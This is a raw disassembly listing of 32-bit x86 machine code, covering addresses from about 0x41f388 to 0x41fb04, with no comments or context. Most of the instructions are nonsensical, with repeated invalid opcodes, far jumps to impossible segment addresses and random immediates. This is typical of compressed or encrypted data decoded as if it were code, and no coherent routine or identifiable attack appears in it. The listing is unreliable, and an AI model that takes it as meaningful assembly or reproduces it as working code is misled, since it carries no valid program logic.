  41f388:	xor    ch,BYTE PTR [edx+esi*2]
  41f38b:	into   
  41f38c:	leave  
  41f38d:	jmp    0x41f310
  41f38f:	nop
  41f390:	add    bh,bh
  41f392:	pop    ss
  41f393:	cs enter 0x3582,0x75
  41f398:	dec    ecx
  41f399:	dec    ebp
  41f39a:	jl     0x41f3ab
  41f39c:	mov    eax,ds:0x5a4bb078
  41f3a1:	mov    WORD PTR [eax-0x5a8baa4f],cs
  41f3a7:	sbb    eax,DWORD PTR [bx+si]
  41f3aa:	mov    cl,0xb7
  41f3ac:	sub    dh,bl
  41f3ae:	sub    DWORD PTR [eax],eax
  41f3b0:	xor    eax,0xd7e95847
  41f3b5:	cmp    DWORD PTR [edi+0x6c],edx
  41f3b8:	push   0x13
  41f3ba:	(bad)  
  41f3bb:	add    al,0xbf
  41f3bd:	cmp    al,0xdb
  41f3bf:	clc    
  41f3c0:	dec    esp
  41f3c1:	(bad)  
  41f3c2:	cmp    ah,dl
  41f3c4:	dec    esi
  41f3c5:	add    edx,edi
  41f3c7:	sbb    DWORD PTR [eax],edx
  41f3c9:	icebp  
  41f3ca:	cmp    BYTE PTR [edi-0x7b],al
  41f3cd:	stc    
  41f3ce:	cwde   
  41f3cf:	ja     0x41f430
  41f3d1:	lahf   
  41f3d2:	sbb    al,0x64
  41f3d4:	es repz mov edi,0x82a8b870
  41f3db:	jl     0x41f44e
  41f3dd:	or     al,0x41
  41f3df:	add    eax,0x27f9374a
  41f3e4:	dec    ecx
  41f3e5:	sbb    eax,0xfb77c169
  41f3ea:	mov    al,fs:0x616a8a84
  41f3f0:	xchg   edi,eax
  41f3f1:	adc    ch,BYTE PTR [ebp-0x19]
  41f3f4:	repnz add al,0xa0
  41f3f7:	cmp    eax,0xdc9e23ef
  41f3fc:	mov    WORD PTR fs:[esi+0x4c918fbe],?
  41f403:	xor    ebx,ebx
  41f405:	mov    ch,bh
  41f407:	jo     0x41f3ee
  41f409:	sub    ah,dl
  41f40b:	fisubr DWORD PTR [edx]
  41f40d:	test   al,0x5f
  41f40f:	call   0xe2697a25
  41f414:	jge    0x41f3af
  41f416:	mov    BYTE PTR [ebp+ebx*2+0x17],dh
  41f41a:	cmp    DWORD PTR [ecx-0x45],ecx
  41f41d:	xchg   ecx,eax
  41f41e:	mov    edi,0xbb954b74
  41f423:	mov    al,0x5c
  41f425:	or     al,0xb0
  41f427:	and    BYTE PTR [esp+eiz*8+0x3a],bh
  41f42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f42c:	jmp    0xc3c3d0a3
  41f431:	pushf  
  41f432:	neg    DWORD PTR [esi+0x75]
  41f435:	and    DWORD PTR [eax+0x67],edi
  41f438:	test   BYTE PTR [ebx],ch
  41f43a:	xor    ebp,ebx
  41f43c:	pop    edx
  41f43d:	test   DWORD PTR [ebx+0x68c54639],esp
  41f443:	jg     0x41f445
  41f445:	add    BYTE PTR [eax],al
  41f447:	add    BYTE PTR [eax],al
  41f449:	add    BYTE PTR [edx+0x4d],dl
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	pop    edi
  41f457:	mov    ch,0xb5
  41f459:	push   ss
  41f45a:	rol    BYTE PTR [ebx+0x6820001],cl
  41f460:	add    BYTE PTR [eax],al
  41f462:	std    
  41f463:	push   0x13801957
  41f468:	loopne 0x41f3fe
  41f46a:	lds    ebx,FWORD PTR [eax-0x4c]
  41f46d:	fistp  DWORD PTR [eax-0x64fdfc8e]
  41f473:	or     edx,ecx
  41f475:	sub    DWORD PTR [ebx],0x33ddad23
  41f47b:	lods   al,BYTE PTR ds:[esi]
  41f47c:	mov    ecx,0xab6d9db5
  41f481:	push   ebx
  41f482:	xor    al,0xe
  41f484:	jmp    0xf809:0x8cdec71
  41f48b:	pop    ebx
  41f48c:	adc    ah,BYTE PTR [edx-0x43]
  41f48f:	adc    ebp,DWORD PTR [eax-0x80]
  41f492:	loope  0x41f4bc
  41f494:	iret   
  41f495:	dec    ecx
  41f496:	(bad)  
  41f497:	popf   
  41f498:	jnp    0x41f478
  41f49a:	mov    al,ds:0x6eb66124
  41f49f:	inc    esp
  41f4a0:	jne    0x41f4ce
  41f4a2:	fistp  DWORD PTR [edx+0x24]
  41f4a5:	out    dx,al
  41f4a6:	pop    ds
  41f4a7:	xchg   esp,eax
  41f4a8:	adc    BYTE PTR [edi+0x72f979f1],0xfd
  41f4af:	adc    DWORD PTR [edi],esi
  41f4b1:	mov    ds:0x8fdec670,al
  41f4b6:	jle    0x41f526
  41f4b8:	jns    0x41f4d0
  41f4ba:	adc    eax,0x9677906
  41f4bf:	stos   BYTE PTR es:[edi],al
  41f4c0:	ror    DWORD PTR [edi+0x1d],0x5f
  41f4c4:	push   0x74be34a0
  41f4c9:	test   al,0xc8
  41f4cb:	add    eax,0xc58ea2d9
  41f4d0:	neg    al
  41f4d2:	inc    edi
  41f4d3:	loopne 0x41f529
  41f4d5:	xor    eax,0xd3c38ce9
  41f4da:	sub    esp,DWORD PTR [ebx-0x1253ae14]
  41f4e0:	mov    ds:0x9429d8b6,eax
  41f4e5:	pop    esp
  41f4e6:	lock sbb DWORD PTR [edi-0x36b25294],0xdfd3fe4b
  41f4f1:	ret    
  41f4f2:	mov    ch,0x38
  41f4f4:	mov    WORD PTR [edx],ss
  41f4f6:	xchg   ecx,eax
  41f4f7:	push   ds
  41f4f8:	imul   BYTE PTR ds:0xdcdff22c
  41f4fe:	mov    esp,edi
  41f500:	test   ecx,ebx
  41f502:	and    eax,0x19a053a3
  41f507:	cli    
  41f508:	add    eax,0x850cefd7
  41f50d:	jle    0x41f56d
  41f50f:	cmp    bh,dl
  41f511:	out    dx,al
  41f512:	jmp    0x9893:0x42c7b4b5
  41f519:	mov    ebx,0xa1a44cca
  41f51e:	sub    ebx,DWORD PTR [ebx+0x3487a529]
  41f524:	popa   
  41f525:	ret    0x74ae
  41f528:	outs   dx,BYTE PTR ds:[esi]
  41f529:	push   eax
  41f52a:	call   0xadc8:0x38a4378b
  41f531:	pop    eax
  41f532:	bound  esi,QWORD PTR [edx+edx*1+0x664631d6]
  41f539:	xor    ah,ch
  41f53b:	sti    
  41f53c:	pushf  
  41f53d:	sub    DWORD PTR [ebx+0x4c6fb57e],eax
  41f543:	inc    ebp
  41f544:	addr16 cli 
  41f546:	(bad)  
  41f547:	retf   
  41f548:	stos   DWORD PTR es:[edi],eax
  41f549:	sbb    dh,BYTE PTR [edx-0x6]
  41f54c:	add    BYTE PTR [edi+0x2ba27256],bh
  41f552:	add    eax,0x684d685
  41f557:	jbe    0x41f544
  41f559:	loope  0x41f5a9
  41f55b:	jb     0x41f592
  41f55d:	cmc    
  41f55e:	fcmovnu st,st(2)
  41f560:	jle    0x41f5cc
  41f562:	cmp    dh,dl
  41f564:	leave  
  41f565:	mov    ebp,0xbd3e7af7
  41f56a:	addr16 and esp,ecx
  41f56d:	xchg   esi,eax
  41f56e:	jo     0x41f510
  41f570:	pop    es
  41f571:	ss popf 
  41f573:	push   0xfffffff9
  41f575:	mov    bl,0x83
  41f577:	sub    eax,DWORD PTR [esi+edx*4]
  41f57a:	dec    esp
  41f57b:	pop    ebp
  41f57c:	test   DWORD PTR [eax-0x73],ebp
  41f57f:	aam    0x58
  41f581:	push   esi
  41f582:	pop    esp
  41f583:	aaa    
  41f584:	out    dx,al
  41f585:	and    DWORD PTR [ebx],0x14
  41f588:	pushf  
  41f589:	xchg   esp,esi
  41f58b:	mov    al,ds:0x313fe3ae
  41f590:	call   0x7c85:0x458f342c
  41f597:	jo     0x41f5e5
  41f599:	inc    eax
  41f59a:	sub    edx,ebp
  41f59c:	push   eax
  41f59d:	sub    DWORD PTR [ecx],ebp
  41f59f:	test   bh,cl
  41f5a1:	jns    0x41f5c7
  41f5a3:	ins    BYTE PTR es:[edi],dx
  41f5a4:	mov    ?,WORD PTR [esi-0x30]
  41f5a7:	int3   
  41f5a8:	imul   ebp,DWORD PTR [ecx],0x5b0cc1d3
  41f5ae:	add    DWORD PTR [esi-0x4e],esp
  41f5b1:	mov    edx,0xdf9b440b
  41f5b6:	and    eax,0x22f222ba
  41f5bb:	adc    DWORD PTR [ebx+ecx*2+0x6235fe21],ebp
  41f5c2:	sub    eax,0x1e845786
  41f5c7:	mov    esi,DWORD PTR [edi+0x5a]
  41f5ca:	inc    edx
  41f5cb:	lods   al,BYTE PTR ds:[esi]
  41f5cc:	not    DWORD PTR [edi-0x7f]
  41f5cf:	cmp    DWORD PTR [ecx],edx
  41f5d1:	call   0x7ea8be1a
  41f5d6:	mov    dh,0xc0
  41f5d8:	adc    dh,BYTE PTR [edi+0x73]
  41f5db:	fstp   DWORD PTR [edi+0x2c3621c8]
  41f5e1:	adc    al,0x38
  41f5e3:	inc    edx
  41f5e4:	push   ds
  41f5e5:	mov    edi,DWORD PTR [ecx]
  41f5e7:	mov    al,0x58
  41f5e9:	and    DWORD PTR [edx+0x71c1686c],esp
  41f5ef:	fcomp  DWORD PTR [ebx+0x37]
  41f5f2:	hlt    
  41f5f3:	mov    DWORD PTR [ebp-0x524756f0],eax
  41f5f9:	fsubr  DWORD PTR [edx]
  41f5fb:	outs   dx,DWORD PTR ds:[esi]
  41f5fc:	mov    dl,0x65
  41f5fe:	adc    eax,0x2e4acdf7
  41f603:	enter  0xc5bb,0xb7
  41f607:	sub    eax,0x107a11a6
  41f60c:	cmp    ebp,DWORD PTR [ebp+0x25]
  41f60f:	out    0x5d,al
  41f611:	into   
  41f612:	xor    DWORD PTR [eax-0x6f],ebx
  41f615:	or     ebp,DWORD PTR [ebx-0x6c]
  41f618:	and    ebp,esi
  41f61a:	test   al,0x9f
  41f61c:	pop    ebp
  41f61d:	xor    eax,0xdf305e99
  41f622:	leave  
  41f623:	retf   
  41f624:	leave  
  41f625:	sbb    eax,0xc9e16cb2
  41f62a:	ficomp DWORD PTR [eax+0x68a49c76]
  41f630:	pop    es
  41f631:	adc    ah,BYTE PTR [ebx-0x2f944a6c]
  41f637:	push   cs
  41f638:	push   esp
  41f639:	icebp  
  41f63a:	fld    TBYTE PTR [esi+0x33]
  41f63d:	ret    
  41f63e:	jmp    0x8632:0xc401a470
  41f645:	mov    bh,0xe
  41f647:	mov    ecx,0xd50e57bf
  41f64c:	push   es
  41f64d:	inc    esp
  41f64e:	fs sub al,0xfb
  41f651:	fiadd  WORD PTR [ecx+eax*4+0x2b53a28d]
  41f658:	mov    bl,0x57
  41f65a:	jge    0x41f61d
  41f65c:	aad    0x22
  41f65e:	bound  edi,QWORD PTR [edi+0x3a]
  41f661:	retf   0x3194
  41f664:	(bad)  
  41f665:	sahf   
  41f666:	push   esi
  41f667:	retf   0x161e
  41f66a:	cmp    DWORD PTR [eax],esp
  41f66c:	mov    al,0xa3
  41f66e:	add    DWORD PTR [eax],0x72d25ba2
  41f674:	pop    ecx
  41f675:	lock in eax,dx
  41f677:	dec    edx
  41f678:	mov    ss:0x6a094841,al
  41f67e:	push   eax
  41f67f:	add    al,0x7c
  41f681:	ins    BYTE PTR es:[edi],dx
  41f682:	cdq    
  41f683:	or     BYTE PTR [edi+ebx*1],cl
  41f686:	int3   
  41f687:	xor    bh,BYTE PTR [esi-0x6a]
  41f68a:	dec    ecx
  41f68b:	inc    ebx
  41f68c:	pusha  
  41f68d:	scas   eax,DWORD PTR es:[edi]
  41f68e:	xchg   ecx,eax
  41f68f:	push   0x704cc226
  41f694:	mov    ah,BYTE PTR [ecx]
  41f696:	jo     0x41f715
  41f698:	xchg   esp,eax
  41f699:	mov    al,0x21
  41f69b:	xor    bh,BYTE PTR ds:[edx+eiz*2-0x59e77da2]
  41f6a3:	cmp    DWORD PTR [ebx+0x6c],edi
  41f6a6:	dec    esi
  41f6a7:	xlat   BYTE PTR ds:[ebx]
  41f6a8:	mov    eax,ds:0x6bde1b2c
  41f6ad:	push   esp
  41f6ae:	rcl    DWORD PTR [edx],1
  41f6b0:	scas   eax,DWORD PTR es:[edi]
  41f6b1:	out    dx,eax
  41f6b2:	and    edi,ebx
  41f6b4:	ret    
  41f6b5:	outs   dx,BYTE PTR ds:[esi]
  41f6b6:	in     eax,dx
  41f6b7:	(bad)  
  41f6b8:	int3   
  41f6b9:	lds    ecx,FWORD PTR [eax+eiz*4]
  41f6bc:	pusha  
  41f6bd:	pop    es
  41f6be:	push   ebx
  41f6bf:	push   eax
  41f6c0:	jne    0x41f6dc
  41f6c2:	or     DWORD PTR [eax-0x24325804],edi
  41f6c8:	push   ebp
  41f6c9:	lods   eax,DWORD PTR ds:[esi]
  41f6ca:	inc    esi
  41f6cb:	push   ecx
  41f6cc:	test   al,0x10
  41f6ce:	inc    esi
  41f6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6d0:	int3   
  41f6d1:	inc    edx
  41f6d2:	inc    edi
  41f6d3:	xchg   edi,eax
  41f6d4:	jecxz  0x41f679
  41f6d6:	cmp    DWORD PTR [ebp+0x2218aa3],0x9d80242b
  41f6e0:	aas    
  41f6e1:	mov    ds:0xaf4cfefc,al
  41f6e6:	lea    esi,ss:[edx-0x4ae66904]
  41f6ed:	aaa    
  41f6ee:	mov    ecx,0x56d8757e
  41f6f3:	loopne 0x41f731
  41f6f5:	mov    ecx,0x5b47be7d
  41f6fa:	mov    ds:0xa689e096,eax
  41f6ff:	pusha  
  41f700:	cmp    ebx,DWORD PTR [eax]
  41f702:	xor    DWORD PTR [eax-0x71],edi
  41f705:	push   ebx
  41f706:	in     eax,0x57
  41f708:	xchg   edi,eax
  41f709:	pop    ecx
  41f70a:	and    edx,0xffffffb7
  41f70d:	inc    ebp
  41f70e:	scas   al,BYTE PTR es:[edi]
  41f70f:	dec    DWORD PTR [ebp+ebx*4+0x3bb39c50]
  41f716:	mov    ebp,0x67809aa7
  41f71b:	cli    
  41f71c:	pop    ebp
  41f71d:	adc    eax,DWORD PTR [edx-0x1]
  41f720:	ins    BYTE PTR es:[edi],dx
  41f721:	pop    edi
  41f722:	mov    ds:0x4dc6047d,al
  41f727:	sub    eax,0x91de57ab
  41f72c:	fcomp  DWORD PTR [ecx+eax*1-0x36]
  41f730:	push   edi
  41f731:	in     al,dx
  41f732:	int    0xdd
  41f734:	and    bl,al
  41f736:	push   eax
  41f737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f738:	pop    ebp
  41f739:	xchg   DWORD PTR [esp+edi*1+0x8a33ed1],edx
  41f740:	jg     0x41f7a0
  41f742:	ja     0x41f784
  41f744:	call   0x64bc:0xb0f17a5f
  41f74b:	lods   al,BYTE PTR ds:[esi]
  41f74c:	fwait
  41f74d:	cmp    DWORD PTR [ecx+0x61bacb09],edx
  41f753:	fmul   QWORD PTR [eax-0x2c]
  41f756:	jb     0x41f796
  41f758:	or     edi,DWORD PTR [ebx+ebx*8+0x2f]
  41f75c:	ins    DWORD PTR es:[edi],dx
  41f75d:	popa   
  41f75e:	jns    0x41f6ed
  41f760:	nop
  41f761:	rcr    ecx,1
  41f763:	sbb    DWORD PTR [edx],0x56121693
  41f769:	push   edi
  41f76a:	inc    edi
  41f76b:	leave  
  41f76c:	push   ebp
  41f76d:	jo     0x41f7b3
  41f76f:	fwait
  41f770:	xor    al,0xce
  41f772:	icebp  
  41f773:	lahf   
  41f774:	mov    eax,0x98c304c2
  41f779:	inc    ebx
  41f77a:	mov    cl,0xda
  41f77c:	fcomp  DWORD PTR [esi]
  41f77e:	jmp    0x49e0298
  41f783:	xchg   ecx,eax
  41f784:	mov    dh,0xc5
  41f786:	mov    ebx,0xd7194944
  41f78b:	out    0x7b,eax
  41f78d:	ffree  st(2)
  41f78f:	push   edi
  41f790:	jae    0x41f7c0
  41f792:	sub    DWORD PTR [edi],esp
  41f794:	loop   0x41f810
  41f796:	push   0x67
  41f798:	out    dx,al
  41f799:	sub    dh,bl
  41f79b:	in     eax,0xd7
  41f79d:	sbb    BYTE PTR [edi],bl
  41f79f:	out    dx,al
  41f7a0:	loope  0x41f814
  41f7a2:	cld    
  41f7a3:	out    0x53,al
  41f7a5:	cmp    BYTE PTR [esi],0x4f
  41f7a8:	cmp    ebx,0x62ca120d
  41f7ae:	loop   0x41f7c7
  41f7b0:	add    dh,al
  41f7b2:	mov    cl,0x71
  41f7b4:	mov    dh,0xff
  41f7b6:	enter  0x1a14,0x34
  41f7ba:	dec    ebx
  41f7bb:	gs test eax,0xa8aafbd4
  41f7c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7c2:	ins    BYTE PTR es:[edi],dx
  41f7c3:	cmp    al,0x6c
  41f7c5:	xor    BYTE PTR [esp+ebp*1-0x5f],bh
  41f7c9:	push   0x529ad929
  41f7ce:	pop    es
  41f7cf:	scas   al,BYTE PTR es:[edi]
  41f7d0:	(bad)  
  41f7d2:	cwde   
  41f7d3:	shl    DWORD PTR [ecx+0x58],0xb5
  41f7d7:	js     0x41f7bf
  41f7d9:	mov    ch,0x2
  41f7db:	jmp    0x41f85b
  41f7dd:	xchg   esi,eax
  41f7de:	fnstsw WORD PTR [esi+0x8]
  41f7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e2:	pop    ebx
  41f7e3:	push   esi
  41f7e4:	sub    eax,0xf47622ac
  41f7e9:	pop    ds
  41f7ea:	jns    0x41f848
  41f7ec:	ins    BYTE PTR es:[edi],dx
  41f7ed:	xchg   ebx,eax
  41f7ee:	mov    esp,0x4f58a4e
  41f7f3:	add    al,0x54
  41f7f5:	fcmovnb st,st(4)
  41f7f7:	out    dx,eax
  41f7f8:	xchg   DWORD PTR [esi+0x2d],ebp
  41f7fb:	xor    cl,BYTE PTR [ebp-0x50ad6a96]
  41f801:	adc    ch,dh
  41f803:	mov    ds:0xd8486559,al
  41f808:	iret   
  41f809:	cmc    
  41f80a:	pop    edx
  41f80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f80c:	cmp    esi,edx
  41f80e:	test   al,0x96
  41f810:	inc    edi
  41f811:	mov    ecx,0x66c46074
  41f816:	imul   ecx,DWORD PTR [ebx],0x524c6ecb
  41f81c:	pop    es
  41f81d:	dec    eax
  41f81e:	outs   dx,DWORD PTR ds:[esi]
  41f81f:	addr16 mov eax,ds:0x177a
  41f823:	shl    esi,1
  41f825:	or     DWORD PTR [ebx+edi*8-0x4a],ebp
  41f829:	mov    ds:0xedc8d97,eax
  41f82e:	jns    0x41f8a9
  41f830:	jne    0x41f816
  41f832:	xchg   DWORD PTR [ebp+0x75f763c8],esp
  41f838:	xor    al,BYTE PTR [ebx+eiz*4]
  41f83b:	push   ebx
  41f83c:	(bad)  
  41f83d:	cdq    
  41f83e:	mov    bh,0x79
  41f840:	cli    
  41f841:	mov    dl,0xec
  41f843:	xchg   ecx,eax
  41f844:	std    
  41f845:	gs test eax,0xc7f66e53
  41f84b:	out    0xe9,al
  41f84d:	mov    DWORD PTR [eax],edi
  41f84f:	xchg   ebp,eax
  41f851:	jecxz  0x41f839
  41f853:	mov    edi,edx
  41f855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f856:	clc    
  41f857:	pop    ds
  41f858:	mov    dh,BYTE PTR [eax-0x30]
  41f85b:	imul   ecx,DWORD PTR [ebx+ebp*4-0x17],0xffffff93
  41f860:	lods   eax,DWORD PTR ds:[esi]
  41f861:	fild   DWORD PTR [ecx+0xf]
  41f864:	test   al,0x94
  41f866:	stos   BYTE PTR es:[edi],al
  41f867:	mov    ecx,fs
  41f869:	jmp    0x8cc28800
  41f86e:	js     0x41f876
  41f870:	push   cs
  41f871:	test   eax,0x9804b2aa
  41f876:	cmp    al,0x56
  41f878:	iret   
  41f879:	cmp    BYTE PTR [ebx+0x63e14e8d],dh
  41f87f:	or     dh,BYTE PTR [eax-0x1e]
  41f882:	repz aad 0x6c
  41f885:	add    ah,BYTE PTR [ecx-0x3b5325d]
  41f88b:	bound  ecx,QWORD PTR [esi+ecx*8]
  41f88e:	mov    eax,0xac6b9bb
  41f893:	pop    ecx
  41f894:	jb     0x41f88c
  41f896:	mov    edx,0xbb3be87f
  41f89b:	cmp    DWORD PTR [ebp+0x26],edx
  41f89e:	inc    ebp
  41f89f:	cmp    ecx,edi
  41f8a1:	ds xchg edx,eax
  41f8a3:	sbb    eax,0x9b06ad22
  41f8a8:	cmp    BYTE PTR [esi+0x23c52f5b],ah
  41f8ae:	jbe    0x41f87b
  41f8b0:	iret   
  41f8b1:	xor    DWORD PTR [ebx],ebp
  41f8b3:	scas   eax,DWORD PTR es:[edi]
  41f8b4:	mov    esi,0x83ae8d
  41f8b9:	jp     0x41f908
  41f8bb:	sub    eax,0x121701c1
  41f8c0:	and    eax,0x1bd7bb90
  41f8c5:	jp     0x41f943
  41f8c7:	(bad)
  41f8ca:	cld    
  41f8cb:	rcr    ecx,cl
  41f8cd:	test   eax,0x378baa9b
  41f8d2:	scas   eax,DWORD PTR es:[edi]
  41f8d3:	add    DWORD PTR [ebx+0x7d3c8d7d],ecx
  41f8d9:	adc    ch,BYTE PTR [ebp+0x55eaadbc]
  41f8df:	lahf   
  41f8e0:	push   es
  41f8e1:	test   BYTE PTR [edi],dh
  41f8e3:	sbb    DWORD PTR [edi-0x6006ecb4],edx
  41f8e9:	mov    cl,0x91
  41f8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8ec:	shl    DWORD PTR [ebp-0x159fad6],1
  41f8f2:	cld    
  41f8f3:	pop    edx
  41f8f4:	in     al,dx
  41f8f5:	sub    DWORD PTR [ebx],eax
  41f8f7:	(bad)  
  41f8f8:	dec    edx
  41f8f9:	push   esp
  41f8fa:	retf   0x1325
  41f8fd:	jg     0x41f885
  41f8ff:	js     0x41f892
  41f901:	shr    BYTE PTR [eax+esi*1],1
  41f904:	cmp    al,0xcf
  41f906:	push   esp
  41f907:	retf   0xc413
  41f90a:	(bad)  [esi-0x29d938ef]
  41f911:	inc    eax
  41f912:	adc    al,0x31
  41f914:	arpl   WORD PTR [ebx],dx
  41f916:	fistp  WORD PTR cs:[eax]
  41f919:	jns    0x41f8b4
  41f91b:	adc    al,0xba
  41f91d:	sbb    BYTE PTR [ecx+edx*4+0x5de0713d],cl
  41f924:	sbb    DWORD PTR [ebp-0x27],0x2fde3ca9
  41f92b:	mov    dl,0x0
  41f92d:	and    eax,0x1be39713
  41f932:	fs cmp eax,0x4ea9f2a6
  41f938:	sahf   
  41f939:	dec    esi
  41f93a:	les    esp,FWORD PTR [edx-0x196432fb]
  41f940:	and    eax,0xa6d0e945
  41f945:	ficom  DWORD PTR [ebp+0x60]
  41f948:	loopne 0x41f99e
  41f94a:	ret    0x9f25
  41f94d:	jb     0x41f9b9
  41f94f:	mov    dh,0x99
  41f951:	push   ecx
  41f952:	dec    ebp
  41f953:	jl     0x41f948
  41f955:	sbb    BYTE PTR [ebp+ecx*8+0x65589afe],0xb3
  41f95d:	add    edi,DWORD PTR [esi+0x22f68b2f]
  41f963:	bound  ecx,QWORD PTR [ecx+0x54]
  41f966:	push   ecx
  41f967:	pop    esp
  41f968:	out    dx,al
  41f969:	pop    ss
  41f96a:	mov    al,ds:0x4a0b44e2
  41f96f:	xchg   edi,eax
  41f970:	dec    esi
  41f971:	sbb    al,0x1c
  41f973:	xchg   DWORD PTR [edx-0x14a39b84],edx
  41f979:	scas   al,BYTE PTR es:[edi]
  41f97a:	lahf   
  41f97b:	sbb    esi,DWORD PTR [edi+0x5e55d0e1]
  41f981:	xor    edi,0xf9977c4b
  41f987:	retf   
  41f988:	mov    ebp,eax
  41f98a:	sbb    DWORD PTR [ecx],edx
  41f98c:	(bad)  
  41f98e:	jmp    FWORD PTR [ecx]
  41f990:	push   ebp
  41f991:	stos   DWORD PTR es:[edi],eax
  41f992:	retf   0x73a7
  41f995:	mov    esi,0xee1d3710
  41f99a:	es sahf 
  41f99c:	sub    DWORD PTR [ebx],eax
  41f99e:	inc    eax
  41f99f:	in     eax,0x8c
  41f9a1:	mov    dh,0xb7
  41f9a3:	jl     0x41fa1f
  41f9a5:	es data16 aam 0xf0
  41f9a9:	sub    al,0x47
  41f9ab:	call   0x37a:0x7200f0d5
  41f9b2:	cmc    
  41f9b3:	adc    al,0xa2
  41f9b5:	xchg   BYTE PTR [ebp+0x49],ch
  41f9b8:	add    dh,al
  41f9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9bb:	fwait
  41f9bc:	xchg   cl,al
  41f9be:	xor    dh,cl
  41f9c0:	xchg   edi,esp
  41f9c2:	xor    cl,BYTE PTR [edi+0x70286486]
  41f9c8:	call   0x30c53888
  41f9cd:	and    DWORD PTR [ebp+ebp*1-0x353f7037],ebx
  41f9d4:	mov    bh,0x54
  41f9d6:	inc    ecx
  41f9d7:	std    
  41f9d8:	data16 js 0x41f983
  41f9db:	pop    ss
  41f9dc:	shr    DWORD PTR [ecx*2+0x7adbc26e],cl
  41f9e3:	rol    DWORD PTR [esi*4-0x3546abae],0x5f
  41f9eb:	in     eax,dx
  41f9ec:	mov    ebp,0xf84bdda2
  41f9f1:	cmp    BYTE PTR [ebp-0x6da4baf3],dh
  41f9f7:	or     BYTE PTR [ebp-0x1f507156],ah
  41f9fd:	cmp    BYTE PTR [ecx+0x5fc711c0],bl
  41fa03:	xchg   esp,eax
  41fa04:	sbb    al,0x48
  41fa06:	icebp  
  41fa07:	fiadd  WORD PTR [edx]
  41fa09:	sub    ebx,DWORD PTR [ebx]
  41fa0b:	push   cs
  41fa0c:	mov    eax,DWORD PTR [ebp-0x1b]
  41fa0f:	or     eax,0x143aee46
  41fa14:	push   0xffffff8c
  41fa16:	xchg   ebp,eax
  41fa17:	std    
  41fa18:	cmp    ebx,DWORD PTR ds:0x2c0a601a
  41fa1f:	cmp    edi,esi
  41fa21:	pop    esp
  41fa22:	adc    eax,0x5b9ec7ac
  41fa27:	pop    ebx
  41fa28:	mov    eax,0x14898698
  41fa2d:	pop    ebx
  41fa2e:	xor    eax,0x6ff0a686
  41fa33:	xlat   BYTE PTR es:[ebx]
  41fa35:	cmp    DWORD PTR [ecx-0x2f],esi
  41fa38:	retf   
  41fa39:	push   ds
  41fa3a:	push   ebx
  41fa3b:	pop    esi
  41fa3c:	xchg   BYTE PTR ds:0x68dc2e7e,dl
  41fa42:	dec    ebp
  41fa43:	ss jno 0x41fa8d
  41fa46:	fimul  DWORD PTR [ebp+0x275ccf24]
  41fa4c:	mov    cl,0x69
  41fa4e:	add    eax,0x91ed5122
  41fa53:	lock jb 0x41faae
  41fa56:	stc    
  41fa57:	dec    edi
  41fa58:	(bad)  
  41fa59:	cmp    al,0xfb
  41fa5b:	push   0x7bd438e2
  41fa60:	out    0xef,eax
  41fa62:	(bad)  [esi+0x68]
  41fa65:	sub    BYTE PTR [ebx+0x2ac1f879],ch
  41fa6b:	pop    esi
  41fa6c:	jo     0x41fab5
  41fa6e:	in     eax,dx
  41fa6f:	lods   eax,DWORD PTR ds:[esi]
  41fa70:	loopne 0x41fa18
  41fa72:	hlt    
  41fa73:	scas   eax,DWORD PTR es:[edi]
  41fa74:	pushf  
  41fa75:	rcl    BYTE PTR [ebp+0x461eface],1
  41fa7b:	mov    bh,0xdf
  41fa7d:	nop
  41fa7e:	cmp    ecx,DWORD PTR [ecx-0x1e]
  41fa81:	es dec eax
  41fa83:	outs   dx,DWORD PTR ds:[esi]
  41fa84:	and    dh,ch
  41fa86:	and    dh,BYTE PTR [edi+0x10]
  41fa89:	add    eax,0x4b17dcc6
  41fa8e:	sub    BYTE PTR [ecx+0x47b815bc],0xa2
  41fa95:	cmp    ecx,edi
  41fa97:	mov    ch,0xf9
  41fa99:	mov    DWORD PTR [ebp+ebp*2+0x77],eax
  41fa9d:	push   ss
  41fa9e:	and    DWORD PTR [ecx],edx
  41faa0:	xor    eax,0xfdc31abe
  41faa5:	and    al,0x1c
  41faa7:	stos   BYTE PTR es:[edi],al
  41faa8:	jmp    FWORD PTR [edi]
  41faaa:	outs   dx,BYTE PTR ds:[esi]
  41faab:	neg    ecx
  41faad:	hlt    
  41faae:	dec    edx
  41faaf:	out    dx,eax
  41fab0:	int3   
  41fab1:	add    eax,0xc5aae85a
  41fab6:	(bad)  
  41fab8:	jle    0x41fa63
  41faba:	dec    esp
  41fabb:	cmp    BYTE PTR [ebx],ch
  41fabd:	js     0x41faf8
  41fabf:	cmp    ebp,DWORD PTR [ecx]
  41fac1:	inc    edi
  41fac2:	push   DWORD PTR [edi-0x27d3dcd9]
  41fac8:	xchg   DWORD PTR [eax+0x6efccd0a],esp
  41face:	jb     0x41fb18
  41fad0:	ds aad 0x1
  41fad3:	lahf   
  41fad4:	inc    edx
  41fad5:	jbe    0x41fb3c
  41fad7:	xor    esp,eax
  41fad9:	adc    al,0x28
  41fadb:	mov    ds:0xd3d9f29b,al
  41fae0:	bound  ebx,QWORD PTR [eax+0x70]
  41fae3:	lahf   
  41fae4:	add    BYTE PTR [eax],al
  41fae6:	add    BYTE PTR [eax],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	pop    eax
  41faeb:	dec    edx
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	and    edx,edi
  41faf8:	xchg   DWORD PTR [esp+edx*2],ebx
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [edx-0x69fffffa],al
  41fb03:	lods   al,BYTE PTR ds:[esi]
  41fb04:	mov    eax,ds:0xbe6fe91d
